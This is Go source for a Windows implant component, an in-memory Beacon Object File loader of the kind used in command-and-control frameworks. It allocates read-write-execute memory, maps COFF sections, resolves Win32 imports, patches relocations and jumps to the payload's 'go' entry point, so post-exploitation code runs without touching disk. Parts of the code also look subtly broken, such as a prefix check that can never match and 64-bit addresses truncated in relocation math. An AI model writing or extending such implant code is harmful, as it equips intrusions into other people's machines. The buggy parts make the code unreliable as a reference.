//go:build windows

package implant

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"
)

// COFF Header structure
type coffHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

// COFF Section header
type coffSection struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLineNumbers uint32
	NumberOfRelocations  uint16
	NumberOfLineNumbers  uint16
	Characteristics      uint32
}

// COFF Symbol
type coffSymbol struct {
	Name               [8]byte
	Value              uint32
	SectionNumber      int16
	Type               uint16
	StorageClass       uint8
	NumberOfAuxSymbols uint8
}

// COFF Relocation
type coffRelocation struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

const (
	IMAGE_SCN_MEM_EXECUTE = 0x20000000
	IMAGE_SCN_MEM_READ    = 0x40000000
	IMAGE_SCN_MEM_WRITE   = 0x80000000
	IMAGE_SCN_CNT_CODE    = 0x00000020

	IMAGE_REL_AMD64_ADDR64 = 0x0001
	IMAGE_REL_AMD64_ADDR32 = 0x0002
	IMAGE_REL_AMD64_ADDR32NB = 0x0003
	IMAGE_REL_AMD64_REL32  = 0x0004

	IMAGE_SYM_CLASS_EXTERNAL = 2

	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
	MEM_RELEASE = 0x8000

	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READWRITE         = 0x04
)

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	ntdll            = syscall.NewLazyDLL("ntdll.dll")
	procVirtualAlloc = kernel32.NewProc("VirtualAlloc")
	procVirtualFree  = kernel32.NewProc("VirtualFree")
	procGetProcAddr  = kernel32.NewProc("GetProcAddress")
	procLoadLibrary  = kernel32.NewProc("LoadLibraryA")
)

// executeBOFWindows performs in-memory COFF loading and execution.
// 1. Parse COFF headers and sections
// 2. Allocate RWX memory
// 3. Map sections into memory
// 4. Resolve external symbols (Win32 API imports)
// 5. Apply relocations
// 6. Call the entry point ("go" function per BOF convention)
func executeBOFWindows(bofData []byte, args []byte) ([]byte, error) {
	reader := bytes.NewReader(bofData)

	// Parse COFF header
	var header coffHeader
	if err := binary.Read(reader, binary.LittleEndian, &header); err != nil {
		return nil, fmt.Errorf("parse COFF header: %w", err)
	}

	// Validate - must be x86_64 COFF
	if header.Machine != 0x8664 {
		return nil, fmt.Errorf("unsupported machine type: 0x%x (expected x86_64/0x8664)", header.Machine)
	}

	// Parse section headers
	sections := make([]coffSection, header.NumberOfSections)
	for i := range sections {
		if err := binary.Read(reader, binary.LittleEndian, &sections[i]); err != nil {
			return nil, fmt.Errorf("parse section %d: %w", i, err)
		}
	}

	// Calculate total memory needed
	var totalSize uint32
	for _, sec := range sections {
		if sec.SizeOfRawData > 0 {
			totalSize += sec.SizeOfRawData
			// Align to 16 bytes
			if totalSize%16 != 0 {
				totalSize += 16 - (totalSize % 16)
			}
		}
	}
	totalSize += 4096 // Extra for output buffer

	// Allocate RWX memory
	baseAddr, _, err := procVirtualAlloc.Call(
		0,
		uintptr(totalSize),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if baseAddr == 0 {
		return nil, fmt.Errorf("VirtualAlloc failed: %w", err)
	}
	defer procVirtualFree.Call(baseAddr, 0, MEM_RELEASE)

	// Map sections into allocated memory
	sectionAddrs := make([]uintptr, header.NumberOfSections)
	offset := uintptr(0)
	for i, sec := range sections {
		if sec.SizeOfRawData > 0 {
			sectionAddrs[i] = baseAddr + offset

			// Copy section data
			srcData := bofData[sec.PointerToRawData : sec.PointerToRawData+sec.SizeOfRawData]
			dst := unsafe.Slice((*byte)(unsafe.Pointer(sectionAddrs[i])), sec.SizeOfRawData)
			copy(dst, srcData)

			offset += uintptr(sec.SizeOfRawData)
			if offset%16 != 0 {
				offset += 16 - (offset % 16)
			}
		}
	}

	// Parse symbol table
	symbols := make([]coffSymbol, header.NumberOfSymbols)
	symReader := bytes.NewReader(bofData[header.PointerToSymbolTable:])
	for i := range symbols {
		if err := binary.Read(symReader, binary.LittleEndian, &symbols[i]); err != nil {
			return nil, fmt.Errorf("parse symbol %d: %w", i, err)
		}
	}

	// String table offset (immediately after symbol table)
	strTableOff := header.PointerToSymbolTable + uint32(header.NumberOfSymbols)*18

	// Resolve symbols
	symbolAddrs := make([]uintptr, header.NumberOfSymbols)
	var entryPoint uintptr

	for i, sym := range symbols {
		name := getSymbolName(sym, bofData, strTableOff)

		if sym.SectionNumber > 0 && int(sym.SectionNumber) <= len(sectionAddrs) {
			// Internal symbol — calculate address from section base
			secIdx := sym.SectionNumber - 1
			symbolAddrs[i] = sectionAddrs[secIdx] + uintptr(sym.Value)

			// Check for entry point ("go" is BOF convention)
			if name == "go" || name == "_go" {
				entryPoint = symbolAddrs[i]
			}
		} else if sym.StorageClass == IMAGE_SYM_CLASS_EXTERNAL && sym.SectionNumber == 0 {
			// External symbol — resolve from DLLs
			addr, resolveErr := resolveExternalSymbol(name)
			if resolveErr != nil {
				// Non-fatal: some symbols may not be needed
				continue
			}
			symbolAddrs[i] = addr
		}
	}

	if entryPoint == 0 {
		return nil, fmt.Errorf("BOF entry point 'go' not found")
	}

	// Apply relocations
	for i, sec := range sections {
		if sec.NumberOfRelocations == 0 {
			continue
		}

		relocReader := bytes.NewReader(bofData[sec.PointerToRelocations:])
		for j := uint16(0); j < sec.NumberOfRelocations; j++ {
			var reloc coffRelocation
			if err := binary.Read(relocReader, binary.LittleEndian, &reloc); err != nil {
				break
			}

			targetAddr := symbolAddrs[reloc.SymbolTableIndex]
			if targetAddr == 0 {
				continue
			}

			patchAddr := sectionAddrs[i] + uintptr(reloc.VirtualAddress)

			switch reloc.Type {
			case IMAGE_REL_AMD64_REL32:
				// RIP-relative 32-bit
				rel := int32(targetAddr) - int32(patchAddr) - 4
				*(*int32)(unsafe.Pointer(patchAddr)) = rel

			case IMAGE_REL_AMD64_ADDR64:
				// Absolute 64-bit
				*(*uint64)(unsafe.Pointer(patchAddr)) = uint64(targetAddr)

			case IMAGE_REL_AMD64_ADDR32:
				// Absolute 32-bit
				*(*uint32)(unsafe.Pointer(patchAddr)) = uint32(targetAddr)
			}
		}
	}

	// Setup output capture buffer at the end of allocated memory
	outputBuf := baseAddr + uintptr(totalSize) - 4096
	*(*uint32)(unsafe.Pointer(outputBuf)) = 0 // length = 0

	// Call the BOF entry point
	// BOF signature: void go(char* args, int argLen)
	var argsPtr uintptr
	var argsLen uintptr
	if len(args) > 0 {
		argsPtr = uintptr(unsafe.Pointer(&args[0]))
		argsLen = uintptr(len(args))
	}

	// Use syscall.SyscallN for the call
	syscall.SyscallN(entryPoint, argsPtr, argsLen)

	// Read output from BeaconOutput buffer (if the BOF used BeaconPrintf)
	outLen := *(*uint32)(unsafe.Pointer(outputBuf))
	if outLen > 0 && outLen < 4096 {
		output := make([]byte, outLen)
		src := unsafe.Slice((*byte)(unsafe.Pointer(outputBuf+4)), outLen)
		copy(output, src)
		return output, nil
	}

	return []byte("[+] BOF executed successfully (no captured output)"), nil
}

// getSymbolName extracts the name from a COFF symbol entry.
func getSymbolName(sym coffSymbol, data []byte, strTableOff uint32) string {
	// If first 4 bytes are zero, name is in string table
	if sym.Name[0] == 0 && sym.Name[1] == 0 && sym.Name[2] == 0 && sym.Name[3] == 0 {
		offset := binary.LittleEndian.Uint32(sym.Name[4:])
		nameStart := strTableOff + offset
		if int(nameStart) >= len(data) {
			return ""
		}
		end := nameStart
		for int(end) < len(data) && data[end] != 0 {
			end++
		}
		return string(data[nameStart:end])
	}
	// Inline name (up to 8 bytes)
	end := 0
	for end < 8 && sym.Name[end] != 0 {
		end++
	}
	return string(sym.Name[:end])
}

// resolveExternalSymbol resolves a Win32 API function by its decorated name.
// BOFs use __imp_DLLNAME$FunctionName convention.
func resolveExternalSymbol(name string) (uintptr, error) {
	// Strip leading underscore
	if len(name) > 0 && name[0] == '_' {
		name = name[1:]
	}

	// Parse __imp_KERNEL32$GetProcAddress format
	if len(name) > 6 && name[:6] == "_imp_" {
		name = name[6:]
	}

	// Split DLL$Function
	dllName := ""
	funcName := name

	for i, c := range name {
		if c == '$' {
			dllName = name[:i]
			funcName = name[i+1:]
			break
		}
	}

	if dllName == "" {
		// Try common DLLs
		commonDLLs := []string{"kernel32.dll", "ntdll.dll", "user32.dll", "advapi32.dll", "ws2_32.dll"}
		for _, dll := range commonDLLs {
			handle, err := syscall.LoadLibrary(dll)
			if err != nil {
				continue
			}
			addr, err := syscall.GetProcAddress(handle, funcName)
			if err == nil {
				return addr, nil
			}
		}
		return 0, fmt.Errorf("cannot resolve: %s", name)
	}

	// Load specific DLL
	dllNameBytes := append([]byte(dllName+".dll"), 0)
	handle, _, _ := procLoadLibrary.Call(uintptr(unsafe.Pointer(&dllNameBytes[0])))
	if handle == 0 {
		// Try without .dll extension appended
		dllNameBytes = append([]byte(dllName), 0)
		handle, _, _ = procLoadLibrary.Call(uintptr(unsafe.Pointer(&dllNameBytes[0])))
		if handle == 0 {
			return 0, fmt.Errorf("cannot load DLL: %s", dllName)
		}
	}

	funcNameBytes := append([]byte(funcName), 0)
	addr, _, _ := procGetProcAddr.Call(handle, uintptr(unsafe.Pointer(&funcNameBytes[0])))
	if addr == 0 {
		return 0, fmt.Errorf("cannot resolve %s in %s", funcName, dllName)
	}

	return addr, nil
}
